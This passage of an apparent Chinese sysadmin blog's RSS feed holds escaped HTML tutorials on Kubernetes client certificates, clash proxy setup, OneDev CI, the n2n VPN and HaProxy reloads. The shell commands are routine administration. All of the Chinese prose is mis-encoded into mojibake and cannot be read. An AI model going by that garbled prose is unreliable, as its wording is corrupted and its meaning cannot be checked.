&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl get csr &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s-access -o &lt;span class=&#34;nv&#34;&gt;jsonpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{.status.certificate}&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 --decode &amp;gt; &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s-access.crt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl config view -o &lt;span class=&#34;nv&#34;&gt;jsonpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{.clusters[0].cluster.certificate-authority-data}&amp;#39;&lt;/span&gt; --raw &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 --decode - &amp;gt; k8s-ca.crt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·CN=readerï¼Œç„¶åå‘é›†ç¾¤å‘é€äº†è¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œæœ€ç»ˆä»é›†ç¾¤è·å¾—äº† reader-k8s-access.crt çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œ k8s-ca.crt çš„ CA è¯ä¹¦ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>clashçš„æ­å»ºæ•™ç¨‹</title>
      <link>https://rendoumi.com/posts/20211108-clash/</link>
      <pubDate>Mon, 08 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211108-clash/</guid>
      <description>&lt;p&gt;æ²¡å•ŠåŠæ³•ï¼Œç¿»å¢™ç¿»å¢™è¿˜æ˜¯ç¿»å¢™ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šæ¸¸æœ‰è‹¥å¹² trojian ã€v2ray ã€sock5 ã€httpå„ç§å„æ ·çš„ä»£ç†ï¼Œè¿™æ ·å¤šç§çš„é€‰æ‹©ï¼Œé‚£ä¹ˆå°±è£…ä¸€ä¸ª clash å®¢æˆ·ç«¯å°±å¯ä»¥å…¨æ¥ç®¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¯´ä¸‹æˆ‘ä»¬çš„åšæ³•ï¼šæ‰¾ä¸ªå°Linuxåšæ—è·¯ç”±ï¼ŒDNSå’Œç½‘å…³éƒ½è®¾ç½®åœ¨è¿™å°æœºå™¨ä¸Šï¼Œå±€åŸŸç½‘å†…çš„æœºå™¨éƒ½é€šè¿‡è¿™å°ä¸Šç½‘ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ clash çš„ Tproxy redir-host å’Œ udp-proxy æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼æ¯”è¾ƒå¼ºå¤§ã€‚ç”¨å°±ç”¨æœ€å¼ºå¤§çš„ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å®‰è£…å¾ˆç®€å•ï¼Œæ“ä½œç³»ç»Ÿ centos æˆ–è€… ubuntu éƒ½è¡Œï¼Œé¡¹ç›®åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Dreamacro/clash&#34;&gt;https://github.com/Dreamacro/clash&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¯´æ˜ä¹¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance&#34;&gt;https://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç°åœ¨ç‰ˆæœ¬æ˜¯ v1.7.1ï¼Œè§£å‹åæ”¾åˆ° /usr/local/bin ç›®å½•ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gzip -d clash-linux-amd64-v1.7.1.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;755&lt;/span&gt; clash-linux-amd64-v1.7.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv clash-linux-amd64-v1.7.1 /usr/local/bin
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åç”Ÿæˆ clash.service&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /etc/systemd/system/clash.service 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Description=clash service
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;After=network.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Type=simple
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;User=root
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Restart=on-failure # or always, on-abort, etc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæœ€é‡è¦çš„ï¼Œå°±æ˜¯é…ç½®æ–‡ä»¶äº†&lt;/p&gt;
&lt;p&gt;æˆ‘è¿™é‡Œè¿™ä¸ªæ—è·¯ç”±çš„è®¾å¤‡ IP åœ°å€æ˜¯ 192.168.2.2ï¼Œç½‘å¡è®¾å¤‡æ˜¯ enp2s0&lt;/p&gt;</description>
    </item>
    <item>
      <title>onedevæ„å»ºä¸€ä¸ªå®é™…java springåº”ç”¨</title>
      <link>https://rendoumi.com/posts/20211108-onedev_maven/</link>
      <pubDate>Mon, 08 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211108-onedev_maven/</guid>
      <description>&lt;p&gt;ä¸Šç¯‡ç®€å•ä»‹ç»äº† onedev ï¼Œè¿™ç¯‡æˆ‘ä»¬å…·ä½“æ‹¿ä¸ª java spring çš„é¡¹ç›®æ¥å®é™…ç¼–è¯‘ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå¿…é¡»ç¡®è®¤ç¯å¢ƒï¼š&lt;/p&gt;
&lt;p&gt;onedev å’Œ agent éƒ½æ˜¯ç”¨ root å®‰è£…è¿è¡Œçš„ï¼Œç„¶åå·²ç»å®‰è£…äº† dockerï¼Œä¸” selinux è®¾ç½®ä¸º disabledï¼Œå¦åˆ™ä¼šå‡ºæƒé™éº»çƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨çš„ä¾‹å­æ˜¯ spring çš„ petclinicï¼Œæ­£å¸¸çš„ build çš„æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/spring-projects/spring-petclinic.git
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; spring-petclinic
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./mvnw package
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬é¦–å…ˆåœ¨ onedev çš„ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-boot&lt;/p&gt;
&lt;p&gt;ç„¶ååˆ° clone ä¸‹æ¥çš„æºä»£ç ç›®å½•ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; spring-petclinic
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git init
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m &lt;span class=&#34;s2&#34;&gt;&amp;#34;Spring boot demo project&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git remote add origin http://192.168.86.101:6610/spring-boot
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push --set-upstream origin master
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥åœ¨ spring-boot é‡Œçœ‹åˆ°ä»£ç äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211105113350311&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211108-onedev_maven/image-20211105113350311.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åçœ‹ä¸Šå›¾ï¼Œæœ‰ä¸ªç´«è‰²ç¯æ³¡ï¼Œ&lt;code&gt;Enable build support by adding.onedev-buildspec.yml&lt;/code&gt;ï¼Œç‚¹é‚£ä¸ªé“¾æ¥&lt;/p&gt;</description>
    </item>
    <item>
      <title>n2nä¸€ç§peer to peerçš„VPNçš„ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20211105-n2n_vpn/</link>
      <pubDate>Fri, 05 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211105-n2n_vpn/</guid>
      <description>&lt;p&gt;vpnçš„æ­å»ºä¸€ç›´æ˜¯ä¸€ä¸ªéš¾è§£çš„é¢˜ç›®ï¼Œopenvpnã€ipsecã€tinc éƒ½åœ¨ç”¨ï¼Œéƒ½ä¸å¤Ÿç®€æ´ã€‚&lt;/p&gt;
&lt;p&gt;n2n æ˜¯ä¸€ç§ peer to peer ç«¯åˆ°ç«¯çš„ vpnï¼Œæ­å»ºèµ·æ¥éå¸¸ç®€å•æ–¹ä¾¿ã€‚å¿…å¤‡åˆ©å™¨&lt;/p&gt;
&lt;p&gt;é¦–å…ˆäº†è§£ä¸€ä¸‹æ¦‚å¿µ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211105135642166&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211105-n2n_vpn/image-20211105135642166.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;n2n çš„ vpn åˆ†ä¸ºä¸¤ç§è§’è‰²ï¼ŒSupernode è¶…çº§èŠ‚ç‚¹å’Œ Edgenode è¾¹ç¼˜èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆç®€å•ï¼ŒSupernode æœ€å¥½æ˜¯å…¬ç½‘åœ°å€ï¼Œéœ€è¦å¼€æ”¾ç«¯å£ä¾›å…¶å®ƒèŠ‚ç‚¹è¿æ¥ä¸Šæ¥ï¼›å‰©ä½™çš„ Edgenode å¯ä»¥æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå„ä¸ª Edgenode è¾¹ç¼˜èŠ‚ç‚¹ä¹‹é—´ä¼šå°è¯•ç»•è¿‡ Supernode ç›´æ¥è¿æ¥ã€‚è¿™å¤§å¤§æé«˜äº†èŠ‚ç‚¹ä¹‹é—´é€šè®¯çš„æ•ˆç‡ã€‚é€šè®¯æ˜¯åŠ å¯†çš„ï¼Œéå¸¸å®‰å…¨ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…çš„è¯å®Œå…¨ä¸ç”¨å®‰è£…ï¼Œç›´æ¥ä¸€ä¸ªå‘½ä»¤å°±æå®šäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ntop/n2n&#34;&gt;https://github.com/ntop/n2n&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¼„å‡ºä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ supernode å’Œ edge å°±å¥½äº†&lt;/p&gt;
&lt;p&gt;è¶…çº§èŠ‚ç‚¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/bin/supernode -p &lt;span class=&#34;m&#34;&gt;11111&lt;/span&gt; -v
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾¹ç¼˜èŠ‚ç‚¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‚æ•°è§£é‡Šï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-d ç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡çš„å‘½å&lt;/li&gt;
&lt;li&gt;-c &lt;!-- raw HTML omitted --&gt; æŸç»„vpnèŠ‚ç‚¹çš„å£ä»¤ã€‚å¤§å®¶çœ‹åˆ°å¯åŠ¨ supernode çš„æ—¶å€™æ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œsupdernode åªè´Ÿè´£è½¬å‘ã€‚supernode æ”¯æŒå¤šç»„ä¸åŒçš„ vpnã€‚è¿™é‡Œå°±æ˜¯ç”¨æ¥åŒºåˆ†ä¸åŒçš„ vpn ç»„çš„ã€‚&lt;/li&gt;
&lt;li&gt;-k &lt;!-- raw HTML omitted --&gt; èŠ‚ç‚¹ä¹‹é—´é€šè®¯æ˜¯ç”¨çš„ twofish åŠ å¯†ç®—æ³•ï¼Œè¿™é‡ŒæŒ‡å®šçš„æ˜¯å¯†é’¥&lt;/li&gt;
&lt;li&gt;-a èŠ‚ç‚¹çš„ip&lt;/li&gt;
&lt;li&gt;-l supernodeçš„ipå’Œç«¯å£&lt;/li&gt;
&lt;li&gt;-f æ”¾åˆ°åå° daemon æ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™æ ·å°±å»ºç«‹å¥½äº†ï¼Œç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å¼  n2n0 çš„ç½‘å¡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸€ç«™å¼Gitè½¯ä»¶onedevçš„å®‰è£…ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20211105-onedev/</link>
      <pubDate>Fri, 05 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211105-onedev/</guid>
      <description>&lt;p&gt;å…¶å®ä¸€ç›´åœ¨ç”¨ githubã€gitlabã€jenkinsï¼Œä½†æ˜¯ github æ—¶ä¸æ—¶çš„æŠ½é£ï¼Œ gitlab çš„ runner å¥— Docker in docker çš„æ–¹æ³•å§”å®å¾ˆéš¾ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ CI/CD è¿™ä¸€å—åå€’æŒºå–œæ¬¢é˜¿é‡Œäº‘æ•ˆè¿™ç§ç®€ä¾¿æ˜“è¡Œçš„ã€‚ä½†ç¡®å®æ‰¾ä¸åˆ°å…¶ä»–åˆé€‚ä¸”ç±»ä¼¼çš„è½¯ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;ä» V2EX ä¸Šçœ‹åˆ°ä¸€ä¸ªè€å“¥å‘çš„ onedevï¼Œæ˜¯ä¸€ä¸ªä¸€ç«™å¼çš„å¼€æºè½¯ä»¶ï¼Œè¿™ä¸å°±è¯•è¯•å…ˆ&lt;/p&gt;
&lt;p&gt;ä»¥ centos7 ä¸ºä¾‹ï¼Œå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…--java-18-ç‰ˆæœ¬&#34;&gt;ä¸€ã€å®‰è£…  java 1.8 ç‰ˆæœ¬&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -ivh jdk-8u201-linux-x64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒå®‰è£…-git-é«˜ç‰ˆæœ¬&#34;&gt;äºŒã€å®‰è£… git é«˜ç‰ˆæœ¬&lt;/h2&gt;
&lt;p&gt;ç¼ºçœ centos7 å’Œ epel å¸¦çš„ git ç‰ˆæœ¬å¤ªä½ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå¾—åŠ ä¸ªæ–°çš„æºè£…æ–°ç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install git curl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ä¸‰å®‰è£…é…ç½®-onedev&#34;&gt;ä¸‰ã€å®‰è£…é…ç½® onedev&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/theonedev/onedev&#34;&gt;https://github.com/theonedev/onedev&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½å‹ç¼©åŒ…ï¼Œç„¶åè§£å‹è¿è¡Œ bin/server.sh start ï¼Œå¾ˆç®€æ´ï¼Œä¸é”™ï¼&lt;/p&gt;
&lt;p&gt;è¿è¡Œå®Œæ‰“å¼€ http://192.168.86.101:6610 è¿›è¡Œåˆå§‹é…ç½®ï¼Œå°±ä¸¤æ­¥å°± ok äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211105110253646&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211105-onedev/image-20211105110253646.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211105110326330&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211105-onedev/image-20211105110326330.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ä¾‹å­&#34;&gt;ä¸‰ã€ä¾‹å­&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬æ˜¯è¦åœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒç”¨çš„ï¼Œæ‰€ä»¥åœ¨ projects æ–°å»ºä¸€ä¸ªé¡¹ç›® spring-bootï¼Œä»¥ spring-petclinic ä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;ç„¶ååˆ°æºä»£ç ç›®å½•ä¸‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>Haproxyçš„Zero downtimeé‡å¯å¦‚ä½•åš</title>
      <link>https://rendoumi.com/posts/20211104-haproxy_restart/</link>
      <pubDate>Thu, 04 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211104-haproxy_restart/</guid>
      <description>&lt;p&gt;Nginx å¯ä»¥ç”¨ kill -HUP æ¥é‡å¯ï¼Œä¸ä¼šä¸¢å¤±å·²å»ºè¿æ¥ã€‚Haproxy å¦‚ä½•åšæ‰èƒ½åšåˆ° zero downtime æ— ç¼é‡è½½å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€é…ç½®&#34;&gt;ä¸€ã€é…ç½®&lt;/h2&gt;
&lt;p&gt;ç¼–è¯‘harpoxyçš„æ—¶å€™å¸¦ä¸Šå‚æ•° USE_SYSTEMDï¼Œé€‰æ‹© Haproxy 1.8 ä»¥ä¸Šç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make &lt;span class=&#34;nv&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;linux2628 &lt;span class=&#34;nv&#34;&gt;USE_GETADDRINFO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_ZLIB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_REGPARM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_OPENSSL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nv&#34;&gt;USE_SYSTEMD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_PCRE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_PCRE_JIT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_NS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Haproxyæ— ç¼é‡è½½æŠ€æœ¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ—§è¿›ç¨‹å½“å‰ç®¡ç†çš„è¿æ¥æ ¹æ® file descriptor æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ socket å¥—æ¥å­—ä¼ è¾“åˆ°æ–°è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ–‡ä»¶socketï¼ˆunix socketï¼‰çš„è¿æ¥æ²¡æœ‰æ–­å¼€ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ–°è¿›ç¨‹åœ¨å……å½“ master-worker ä¸»å·¥ä½œè€…çš„åŒæ—¶æ‰§è¡Œæ­¤ä»»åŠ¡ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡ä½¿ç”¨unix socketæ¥ç»´æŠ¤è¿æ¥çŠ¶æ€å¹¶åœ¨æ—§è¿›ç¨‹å’Œæ–°è¿›ç¨‹ä¹‹é—´ä¼ é€’ï¼Œé˜²æ­¢äº†è¿æ¥ä¸¢å¤±ã€‚&lt;/p&gt;
&lt;p&gt;haproxy çš„è¿è¡Œä½¿ç”¨ Systemd é‡è½½ï¼Œä½¿ç”¨ -Ws æ–¹å¼ã€‚ ï¼ˆæ­¤å¤–ï¼Œåœ¨æ„å»ºæ—¶å¿…é¡»å¯ç”¨ USE_SYSTEMDï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;-D : start as a daemon. The process detaches from the current terminal after&lt;/span&gt;
